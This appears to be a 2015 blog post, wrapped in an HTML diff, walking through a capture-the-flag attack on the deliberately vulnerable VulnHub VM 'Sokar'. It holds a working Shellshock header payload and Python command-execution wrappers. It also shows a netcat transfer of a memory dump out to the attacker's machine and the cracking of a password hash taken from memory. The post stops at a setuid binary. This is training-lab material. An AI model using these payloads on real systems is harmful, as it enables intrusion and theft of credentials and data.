@@ -1,0 +1,1150 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>beating sokar - the vulnhub turns 0b10 challenge &middot; </title>
+
+  
+  <link rel="stylesheet" href="http://leonjza.github.io/css/poole.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/poole-overrides.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde-overrides.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde-x.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/highlight/solarized_light.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://leonjza.github.io/touch-icon-144-precomposed.png">
+  <link href="http://leonjza.github.io/favicon.png" rel="icon">
+
+  
+  
+  
+  
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  
+</head>
+<body class="theme-base-0d">
+<div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      
+        <img src="https://www.gravatar.com/avatar/28d2f6c24dad39f38af0272dfc0da953?s=200"
+             alt="gravatar" title="">
+      
+      <h1></h1>
+      <p class="lead">#!/slash/note<br />
+<em>A checkbox unchecker&rsquo;s notepad</em></p>
+    </div>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item"><a href="http://leonjza.github.io/">Home</a></li>
+      
+      <li class="sidebar-nav-item"><a href="http://leonjza.github.io/about/">About</a></li>
+      
+    </ul>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item">
+      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
+      
+      
+      
+      
+      
+      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
+      
+      
+      </li>
+    </ul>
+
+    
+
+    <p>Copyright &copy; 2016 <a href="http://leonjza.github.io/license/">License</a><br/>
+       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
+  </div>
+</div>
+
+
+<div class="content container">
+  <div class="post">
+    <h1>beating sokar - the vulnhub turns 0b10 challenge</h1>
+    <span class="post-date">Feb 21, 2015 &middot; 31 minute read &middot; <a href="http://leonjza.github.io/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/#disqus_thread">Comments</a>
+    
+    <br/>
+    <a class="label" href="http://leonjza.github.io/categories/ctf">CTF</a><a class="label" href="http://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a><a class="label" href="http://leonjza.github.io/categories/solution">Solution</a><a class="label" href="http://leonjza.github.io/categories/challenge">Challenge</a><a class="label" href="http://leonjza.github.io/categories/vulnhub">VulnHub</a>
+    </span>
+    
+
+<h2 id="introduction:6256545d38ed18a4e5f3162703192bb4">introduction</h2>
+
+<p><a href="http://blog.vulnhub.com/2015/01/vulnhub-is-0b10.html">Vulnhub is 0b10</a> years old. That is binary for 2 :) In order to celebrate this, <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a>
+ created <a href="https://www.vulnhub.com/entry/sokar-1,113/">Sokar</a>.</p>
+
+<p>{% img right <a href="https://i.imgur.com/brPBCGq.png">https://i.imgur.com/brPBCGq.png</a> %}</p>
+
+<p>Sokar was used as another writeup competition (the first for 2015), similar to the <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/">Persistence</a> challenge from Sep &lsquo;14.
+From the <a href="http://blog.vulnhub.com/2015/01/competition-sokar.html">competition announcement blogpost</a>, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
+Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.</p>
+
+<p>Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!</p>
+
+<p>Here is my entry for the competition. Enjoy! :)</p>
+
+<h2 id="a-usual-start:6256545d38ed18a4e5f3162703192bb4">a usual start</h2>
+
+<p>You know the drill. Download the VM, import it into your virtualization software, configure the network and start to fire <code>nmap</code> at it. I followed exactly these steps apart from using the usual <code>netdiscover</code> to determine the assigned IP address. Instead, I recently learnt about the built in VMWare Network Sniffer. So I figured it was time to give that a spin.</p>
+
+<p>I knew which interface the network was bound to on my Mac, so I started the sniffer with <code>sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1</code>:</p>
+
+<pre><code class="language-bash">leonjza@laptop » sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1
+
+[... snip IPv6 talky talky ...]
+
+IP src 0.0.0.0         dst 255.255.255.255 UDP src port 68 dst port 67
+IP src 192.168.217.254 dst 192.168.217.163 UDP src port 67 dst port 68
+</code></pre>
+
+<p><strong>192.168.217.163</strong>. Great. This will be our target for a <code>nmap</code> scan. Sokar did not respond to pings, but that is no biggie. I see this many times in real world networks too, so heh. Don&rsquo;t rely on ICMP traffic ;)</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ nmap --reason 192.168.217.163 -p-
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-02 21:09 SAST
+Nmap scan report for 192.168.217.163
+Host is up, received arp-response (0.00027s latency).
+Not shown: 65534 filtered ports
+Reason: 65534 no-responses
+PORT    STATE SERVICE  REASON
+591/tcp open  http-alt syn-ack
+MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)
+
+Nmap done: 1 IP address (1 host up) scanned in 1133.72 seconds
+</code></pre>
+
+<p>One port open on tcp. <code>tcp/591</code>.</p>
+
+<h2 id="cgi-bin-cat:6256545d38ed18a4e5f3162703192bb4">/cgi-bin/cat</h2>
+
+<p>The service on <code>tcp/591</code> appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML <code>&lt;iframe&gt;</code> to <a href="http://192.168.217.163:591/cgi-bin/cat">http://192.168.217.163:591/cgi-bin/cat</a>. Requesting this page alone was the same stats, minus that creepy pink color ;)</p>
+
+<p>{% img <a href="https://i.imgur.com/nAoNCnK.png">https://i.imgur.com/nAoNCnK.png</a> %}</p>
+
+<p>I toyed around quite a bit with this webserver. The textbook approach of running <code>wfuzz</code> to discover some web paths, <code>nikto</code> to discover some interesting information etc. was used. Alas, none of these tools proved really useful.</p>
+
+<p>Applying some more brain thingies to my current situation, I remembered the <a href="http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29">Shellshock</a> bug disclosed in September 2014. The <code>/cgi-bin</code> path was the biggest hint towards it. I also remembered <a href="https://twitter.com/mubix">@mubix</a> was keeping a Github repository of <a href="https://github.com/mubix/shellshocker-pocs">PoC&rsquo;s for shellshock</a>, and promptly started to try a few against the CGI path.</p>
+
+<p>Eventually, <a href="https://gist.github.com/mfadzilr/70892f43597e7863a8dc">this</a> PoC was modified a little to get me some working command injection via shellshock:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ curl -i -X OPTIONS -H &quot;User-Agent: () { :;};echo;/usr/bin/id&quot; &quot;http://192.168.217.163:591/cgi-bin/cat&quot;
+HTTP/1.1 200 OK
+Date: Mon, 02 Feb 2015 21:23:07 GMT
+Server: Apache/2.2.15 (CentOS)
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/plain; charset=UTF-8
+
+uid=48(apache) gid=48(apache) groups=48(apache)
+</code></pre>
+
+<p>Yay. I was now able to execute commands as <code>apache</code>. This allowed me to enumerate a great deal of the machine with relative ease.</p>
+
+<h2 id="making-life-easier:6256545d38ed18a4e5f3162703192bb4">making life easier</h2>
+
+<p>Of course, constructing the curl request and header for every command that I wanted to run was starting to become boring really quickly. So, I slapped together some python that will accept an argument and execute the command (called <code>shock.py</code>):</p>
+
+<pre><code class="language-python">#!/usr/bin/python
+
+# Sokar Shellshock Command Execution
+# 2015 Leon Jacobs
+
+import requests
+import sys
+
+if len(sys.argv) &lt; 2:
+
+    print &quot; * Usage %s &lt;cmd&gt;&quot; % sys.argv[0]
+    sys.exit(1)
+
+# vuln@ curl -i -X OPTIONS -H &quot;User-Agent: () { :;};echo;/bin/cat /etc/passwd&quot; &quot;http://192.168.217.163:591/cgi-bin/cat&quot;
+command = sys.argv[1].strip()
+print &quot; * Executing %s\n&quot; % command
+
+# prepare the sploit header
+headers = { &quot;User-Agent&quot;: &quot;() { :;};echo;%s&quot; % command }
+print requests.get(&quot;http://192.168.217.163:591/cgi-bin/cat&quot;, headers=headers).text.strip()
+</code></pre>
+
+<p>Using the above script, I could now just do <code>python shock.py &quot;/usr/bin/id&quot;</code>:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python shock.py &quot;/usr/bin/id&quot;
+ * Executing /usr/bin/id
+
+uid=48(apache) gid=48(apache) groups=48(apache)
+</code></pre>
+
+<p>During the initial enumeration phase, I tried to build myself a reverse shell. I confirmed that <code>netcat</code> was available and that <code>apache</code> was allowed to execute it, however, all of my attempts failed. <code>SELinux</code> was disabled so that was not the problem. Eventually I started wondering about egress fire-walling and decided that it was time for a outbound port scan!</p>
+
+<p>I was able to write to <code>/tmp</code>, but for some reason I was having a really hard time getting newlines and quotes escaped so that I could essentially <code>echo &lt;script source&gt; &gt;&gt; /tmp/port_scan.py</code>. Eventually I resorted to writing a helper called <code>transfer.py</code> that was used to copy files over from my local Kali Linux install to the Sokar VM. In the long run, this made it really easy to copy scripts and tools over to Sokar:</p>
+
+<pre><code class="language-python">#!/usr/bin/python
+
+# Sokar Shellshock File Transfer
+# 2015 Leon Jacobs
+
+import requests
+import sys
+import os
+import binascii
+
+def do_command(command):
+
+    headers = { &quot;User-Agent&quot;: &quot;() { :;};echo;%s&quot; % command }
+    r = requests.options(&quot;http://192.168.217.163:591/cgi-bin/cat&quot;, headers=headers)
+
+    if not r.status_code == 200:
+        raise Exception(&quot; ! Command %s failed&quot;)
+
+if __name__ == &quot;__main__&quot;:
+
+    if len(sys.argv) &lt; 3:
+
+        print &quot; * Usage %s &lt;source&gt; &lt;destination&gt;&quot; % sys.argv[0]
+        sys.exit(1)
+
+    # vuln@ curl -i -X OPTIONS -H &quot;User-Agent: () { :;};echo;/bin/cat /etc/passwd&quot; &quot;http://192.168.217.163:591/cgi-bin/cat&quot;
+    source = sys.argv[1].strip()
+    destination = sys.argv[2].strip()
+    print &quot; * Starting transfer of local '%s' to remote '%s'&quot; % (source, destination)
+
+    hex_destination_file = &quot;/tmp/&quot; + binascii.b2a_hex(os.urandom(15)) + &quot;.txt&quot;
+    print &quot; * Temp file on remote will be: %s&quot; % hex_destination_file
+
+    # prepare a hex version of the local file
+    with open(source) as f:
+        source_file = f.read()
+
+    # encode and split the source into chunks of 60
+    source_file = source_file.encode('hex')
+    source_data = {}
+    source_data = [source_file[i:i+60] for i in range(0, len(source_file), 60)]
+
+    print &quot; * Transferring %d chunks to %s&quot; % (len(source_data), hex_destination_file)
+    iteration = 1
+    for chunk in source_data:
+
+        # check if it is start of file or append
+        if iteration == 1:
+            append = &quot;&gt;&quot;
+        else:
+            append = &quot;&gt;&gt;&quot;
+
+        # prepare the command and run it
+        command = &quot;echo '%s' %s %s&quot; % (chunk, append, hex_destination_file)
+        do_command(command)
+
+        print &quot; * Chunk %d/%d transferred&quot; % (iteration, len(source_data))
+        iteration += 1
+
+    print &quot; * Decoding hex on remote&quot;
+    command = &quot;/usr/bin/xxd -r -p %s &gt; %s&quot; % (hex_destination_file, destination)
+    do_command(command)
+
+    print &quot; * Cleaning up temp file %s&quot; % hex_destination_file
+    command = &quot;/bin/rm -f %s&quot; %  hex_destination_file
+    do_command(command)
+
+    print &quot; * Local '%s' transferred to remote '%s'&quot; % (source, destination)
+</code></pre>
+
+<h2 id="egress-firewalls-le-suck:6256545d38ed18a4e5f3162703192bb4">egress firewalls le-suck</h2>
+
+<p>With the file transfer script done, I coded up a small &lsquo;port scanner&rsquo; (though all it really does is try to connect to a port and move on to the next within 0.1s):</p>
+
+<pre><code class="language-python">#!/usr/bin/python
+
+# Sokar Egress Port Scanner
+# 2015 Leon Jacobs
+
+import socket
+
+for port in xrange(1, 65535):
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(0.1)
+    print &quot;Trying port %d&quot; % port
+    sock.connect_ex((&quot;192.168.217.174&quot;, port))
+    sock.close()
+
+</code></pre>
+
+<p>&hellip; and transferred it to Sokar using my <code>transfer.py</code> script:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python transfer.py port_scan.py /tmp/port_scan.py
+ * Starting transfer of local 'port_scan.py' to remote '/tmp/port_scan.py'
+ * Temp file on remote will be: /tmp/cf8ca858a40ecf06741824362c37df.txt
+ * Transferring 10 chunks to /tmp/cf8ca858a40ecf06741824362c37df.txt
+ * Chunk 1/10 transferred
+ * Chunk 2/10 transferred
+ * Chunk 3/10 transferred
+ * Chunk 4/10 transferred
+ * Chunk 5/10 transferred
+ * Chunk 6/10 transferred
+ * Chunk 7/10 transferred
+ * Chunk 8/10 transferred
+ * Chunk 9/10 transferred
+ * Chunk 10/10 transferred
+ * Decoding hex on remote
+ * Cleaning up temp file /tmp/cf8ca858a40ecf06741824362c37df.txt
+ * Local 'port_scan.py' transferred to remote '/tmp/port_scan.py'
+</code></pre>
+
+<p>I also opened up a <code>tcpdump</code> on my local Kali Linux VM, filtering out <code>tcp/591</code> as well as <code>arp</code> traffic:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
+
+</code></pre>
+
+<p>Finally, I fired the scanner off using the previously developed <code>shock.py</code> script:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python shock.py &quot;/usr/bin/python /tmp/port_scan.py&quot;
+ * Executing /usr/bin/python /tmp/port_scan.py
+
+</code></pre>
+
+<p>I waited&hellip; a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the <code>tcpdump</code> had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.</p>
+
+<h2 id="bynarr-the-fruit:6256545d38ed18a4e5f3162703192bb4">bynarr the fruit</h2>
+
+<p>Not having an interactive shell was not the end of the world. Instead of fussing about that I decided to move on to poking around some more. Enumeration revealed that <code>/home/bynarr</code> was readable to me. In there was what looked like a kernel module <code>lime.ko</code> and a script called <code>lime</code> to <code>insmod</code> it. Both were owned by root:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python shock.py &quot;/bin/cat /home/bynarr/lime&quot;
+ * Executing /bin/cat /home/bynarr/lime
+
+#!/bin/bash
+echo &quot;&quot;&quot;
+==========================
+Linux Memory Extractorator
+==========================
+&quot;
+echo &quot;LKM, add or remove?&quot;
+echo -en &quot;&gt; &quot;
+
+read -e input
+
+if [ $input == &quot;add&quot; ]; then
+
+    /sbin/insmod /home/bynarr/lime.ko &quot;path=/tmp/ram format=raw&quot;
+
+elif [ $input == &quot;remove&quot; ]; then
+
+    /sbin/rmmod lime
+
+else
+
+    echo &quot;Invalid input, burn in the fires of Netu!&quot;
+
+fi
+
+</code></pre>
+
+<p>I knew that the chances were slim that it would allow me to run <code>insmod</code> as <code>apache</code>, but ofc I tried running the script regardless. Due to the fact that the file called <code>/tmp/ram</code> was not created after running <code>python shock.py &quot;echo \&quot;add\&quot; | /home/bynarr/lime&quot;</code>, I assumed it failed.</p>
+
+<p>Later, some more enumeration finally got me to <code>/var/spool/mail/bynarr</code> with a message with the following contents:</p>
+
+<pre><code class="language-text">leonjza@kali/sokar $ python shock.py &quot;/bin/cat /var/spool/mail/bynarr&quot;
+ * Executing /bin/cat /var/spool/mail/bynarr
+
+Return-Path: &lt;root@sokar&gt;
+Delivered-To: bynarr@localhost
+Received:  from root by localhost
+To: &lt;bynarr@sokar&gt;
+Date: Thu, 13 Nov 2014 22:04:31 +0100
+Subject: Welcome
+
+Dear Bynarr.  Welcome to Sokar Inc. Forensic Development Team.
+A user account has been setup for you.
+
+UID 500 (bynarr)
+GID 500 (bynarr)
+    501 (forensic)
+
+Password 'fruity'.  Please change this ASAP.
+Should you require, you've been granted outbound ephemeral port access on 51242, to transfer non-sensitive forensic dumps out for analysis.
+
+All the best in your new role!
+
+  -Sokar-
+</code></pre>
+
+<p>I confirmed that <code>bynarr</code> was in the groups mentioned in the mail:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python shock.py &quot;/usr/bin/id bynarr&quot;
+ * Executing /usr/bin/id bynarr
+
+uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
+</code></pre>
+
+<p>What confused me here was the mention of <em>&ldquo;outbound ephemeral port access on 51242&rdquo;</em>. I reduced my port scanners range to only scan from 51240 to 51250 to confirm this. I transferred the updated port scanner to Sokar, opened up a new <code>tcpdump</code> session and waited anxiously. <code>tcp/51242</code> outbound still appeared to be closed.</p>
+
+<p>Of course, the most valuable piece of information was definitely the password <em>fruity</em>. Now, remember, I have a limited shell. Not a interactive one. I have been interfacing with Sokar only via python scripts which are executing commands via Shellshock HTTP requests.</p>
+
+<p>Essentially, the easiest way for me to become <code>bynarr</code> (assuming <em>fruity</em> really is the password), would be to <code>su</code> right? Sounds like a 2 sec job. Well, it wasn’t :( Instead, I got caught up in a whole bunch of interesting situations where <code>su</code> expects a password via <code>stdin</code>, requires a valid tty (which I don’t have) and will spawn a shell for me to interact with (which I can&rsquo;t). Quite some time later, I got closer to becoming <code>bynarr</code> with something like <code>echo fruity | su bynarr</code>. To add to the pain, my shellshock shell also did not have a proper environment, so I had to prefix most commands with their full paths. Luckily though <code>$(which id)</code> came in very handy and saved some time. In retrospect, I could have probably just exported <code>PATH</code> as required, but heh.</p>
+
+<p>Fast forward some time, I came across <a href="http://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells">this</a> SANS blogpost, which details on the topic of some &lsquo;stealthy&rsquo; su shells. Most importantly, the example of <code>(sleep 1; echo password) | python -c &quot;import pty; pty.spawn(['/bin/su','-c','whoami']);&quot;</code> got me the closest to <code>bynarr</code>. Toying around with this a little, I realized that for some reason, the <code>(</code> and <code>)</code> characters were messing around, so I replaced that section with some python too. After a whole bunch attempts, I eventually got this to work:</p>
+
+<p><code>/usr/bin/python -c &quot;import time; time.sleep(1); print 'fruity'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);&quot;</code></p>
+
+<p>(Basically, spawn a tty; attempt to <code>su</code> specifying the command to run with <code>-c</code>, then 1 second later, echo <code>fruity</code> to the <em>Password</em> prompt and execute <code>id</code> as <code>bynarr</code>)</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python shock.py &quot;/usr/bin/python -c \&quot;import time; time.sleep(1); print 'fruity'\&quot; | /usr/bin/python -c \&quot;import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);\&quot;&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(1); print 'fruity'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);&quot;
+
+Password:
+uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
+</code></pre>
+
+<p>:D As this is actually a Shellshock request, the full <code>User-Agent</code> header therefore was:</p>
+
+<pre><code class="language-text">() { :;};echo;/usr/bin/python -c &quot;import time; time.sleep(1); print 'fruity'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);&quot;
+</code></pre>
+
+<p>Again, constructing that every time I want to execute something as <code>bynarr</code> would have been le-suck, so I made another wrapper script:</p>
+
+<pre><code class="language-python">#!/usr/bin/python
+
+# Sokar 'bynarr' command execution
+# 2015 Leon Jacobs
+
+import requests
+import sys
+
+if len(sys.argv) &lt; 2:
+
+    print &quot; * Usage %s &lt;cmd&gt;&quot; % sys.argv[0]
+    sys.exit(1)
+
+command = sys.argv[1].strip()
+payload = &quot;&quot;&quot;/usr/bin/python -c &quot;import time; time.sleep(1); print 'fruity'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su','-c','%s', 'bynarr']);&quot; &quot;&quot;&quot; % command
+print &quot; * Executing %s\n&quot; % payload
+
+# prepare the sploit header
+headers = { &quot;User-Agent&quot;: &quot;() { :;};echo;%s&quot; % payload }
+print requests.get(&quot;http://192.168.217.163:591/cgi-bin/cat&quot;, headers=headers).text.strip()
+</code></pre>
+
+<p>All I have to do to get the output of <code>id</code> is provide it as a argument to <code>bynarr.py</code>:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python bynarr.py &quot;id&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(1); print 'fruity'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);&quot;
+
+Password:
+uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
+</code></pre>
+
+<h2 id="the-scary-linux-memory-extractor:6256545d38ed18a4e5f3162703192bb4">the scary linux memory extractor</h2>
+
+<p>With command access as <code>bynarr</code> and remembering the mention of <code>tcp/51242</code> outbound connectivity, I once more try and run the port scanner that got copied to <code>/tmp</code>:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python bynarr.py &quot;/usr/bin/python /tmp/port_scan.py&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(1); print 'fruity'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su','-c','/usr/bin/python /tmp/port_scan.py', 'bynarr']);&quot;
+
+Password:
+Trying port 51240
+Trying port 51241
+Trying port 51242
+Trying port 51243
+Trying port 51244
+Trying port 51245
+Trying port 51246
+Trying port 51247
+Trying port 51248
+Trying port 51249
+</code></pre>
+
+<p>Checking the <code>tcpdump</code> output of this run&hellip;:</p>
+
+<pre><code class="language-text">leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
+07:33:43.178113 IP 192.168.217.163.40371 &gt; 192.168.217.174.51242: Flags [S], seq 594732851, win 14600, options [mss 1460,sackOK,TS val 2274844 ecr 0,nop,wscale 4], length 0
+07:33:43.178129 IP 192.168.217.174.51242 &gt; 192.168.217.163.40371: Flags [R.], seq 0, ack 594732852, win 0, length 0
+</code></pre>
+
+<p>&hellip; I finally see something coming out of Sokar!
+So <code>bynarr</code> is able to talk out on <code>tcp/51242</code>. Wut. Taking a few moments to think about this, I remembered that <code>iptables</code> is able to filter by user id using the <code>owner</code> module. At this stage, this was the only thing that made sense why <code>apache</code> would not be able to talk out on this port, but <code>bynarr</code> can.</p>
+
+<p>So with that out the way, it was time to focus on this <code>lime</code> thing. <code>bynarr</code> was allowed to run <code>/home/bynarr/lime</code> as root via <code>sudo</code> without a password (as I suspected for the <code>insmod</code>):</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python bynarr.py &quot;sudo -l&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(1); print 'fruity'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su','-c','sudo -l', 'bynarr']);&quot;
+
+Password:
+Matching Defaults entries for bynarr on this host:
+    !requiretty, visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS
+    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1
+    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL
+    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User bynarr may run the following commands on this host:
+    (ALL) NOPASSWD: /home/bynarr/lime
+</code></pre>
+
+<p>I had no freaking idea what <code>lime</code> even really is, so, to the Gooooogles I went and came across this: <a href="https://github.com/504ensicsLabs/LiME">https://github.com/504ensicsLabs/LiME</a>. A forensics tool thingy thing. It seems like I will get to crawl through a dump of the current memory. Cool ;p</p>
+
+<p>I ran the script to <code>insmod</code> the <code>lime.ko</code>, this time with <code>sudo</code>:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python bynarr.py &quot;echo \&quot;add\&quot; | sudo /home/bynarr/lime&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(1); print 'fruity'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su','-c','echo &quot;add&quot; | sudo /home/bynarr/lime', 'bynarr']);&quot;
+
+Password:
+
+==========================
+Linux Memory Extractorator
+==========================
+
+LKM, add or remove?
+&gt;
+
+</code></pre>
+
+<p>I checked <code>/tmp</code> for the existence of the <code>ram</code> file and it was present. Looks like it worked :D. A quick note here. When I imported the VM initially, I upped the memory to 2GB. It was set to only have 256Mb by default which I thought was a little low. Sokar has limited disk space, so I was not getting the full memory dump. When I eventually noticed this, I reduced it back to the initial 256Mb and worked from there.</p>
+
+<p>Remembering the outbound port access, I opened a netcat listener on my local Kali linux to redirect a incoming file to a local <code>ram</code> file with <code>nc -lvp 51242 &gt; ram</code>. Then, using my wrapper script <code>bynarr.py</code> again, I redirected the <code>/tmp/ram</code> file out over the netcat connection with: <code>python bynarr.py &quot;/usr/bin/nc 192.168.217.174 51242 &lt; /tmp/ram&quot;</code>. I now had a memory dump of Sokar on my local Kali Linux.</p>
+
+<p>It was at this stage that I went down the wrong rabbit hole. <a href="https://code.google.com/p/volatility/">Volatility</a> was the first thing that came to mind when I saw this speak of memory dumps and what not. Having always just had this on my todo list, I figured that this was the perfect opportunity to finally give it a spin. I followed most of the docs to try and match the exact same kernel version as Sokar had (I have a number of CentOS VM&rsquo;s) and prepared a profile as required. Short version, it failed. I was not able to get Volatility to give me anything useful. Eventually I reconsidered my approach and went back to trusty &lsquo;ol <code>strings</code>.</p>
+
+<p>I had to think a bit about what could possibly be useful in memory for me now. I noticed the user <code>apophis</code> had a home directory that I have not yet been able to access, so I promptly grepped the ram image for this user:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ strings ram | grep apophis
+
+[... snip ...]
+
+apophis:[snip]0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
+</code></pre>
+
+<p>&hellip; <strong>wut</strong>. Why&hellip; wait a sec. Why the heck is a password hash in memory now. Dont think there has been any activity for this user yet&hellip; but clearly I don’t understand half of the technicalities here :( But hey. Lets run it through <code>john</code>:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ john passwd --wordlist=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;crypt&quot;
+Use the &quot;--format=crypt&quot; option to force loading these as that type instead
+Loaded 1 password hash (sha512crypt [32/32])
+overdrive        (apophis)
+guesses: 1  time: 0:00:01:51 DONE (Sat Jan 31 20:35:42 2015)  c/s: 327  trying: parati - nicole28
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+</code></pre>
+
+<p><code>apophis:overdrive</code>.</p>
+
+<h2 id="build-the-clone-to-the-hook:6256545d38ed18a4e5f3162703192bb4">build the clone to the hook</h2>
+
+<p>To get command execution as <code>apophis.py</code> I copied the <code>bynarr.py</code> script to make <code>apophis.py</code>, changing the username and the password.</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python apophis.py &quot;id&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(2); print 'overdrive'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su', '-l', '-c','id', 'apophis']);&quot;
+
+Password:
+uid=501(apophis) gid=502(apophis) groups=502(apophis)
+</code></pre>
+
+<p>There we go! Command execution as <code>apophis</code> :) In <code>/home/apophis</code> there was a suid (for <code>root</code>) binary called <code>build</code>:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python apophis.py &quot;ls -lah /home/apophis&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(2); print 'overdrive'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su', '-l', '-c','ls -lah /home/apophis', 'apophis']);&quot;
+
+Password:
+total 36K
+drwx------  2 apophis apophis 4.0K Jan  2 20:12 .
+drwxr-xr-x. 4 root    root    4.0K Dec 30 19:20 ..
+-rw-------  1 apophis apophis    9 Feb  2 20:55 .bash_history
+-rw-r--r--  1 apophis apophis   18 Feb 21  2013 .bash_logout
+-rw-r--r--  1 apophis apophis  176 Feb 21  2013 .bash_profile
+-rw-r--r--  1 apophis apophis  124 Feb 21  2013 .bashrc
+-rwsr-sr-x  1 root    root    8.3K Jan  2 17:49 build
+</code></pre>
+
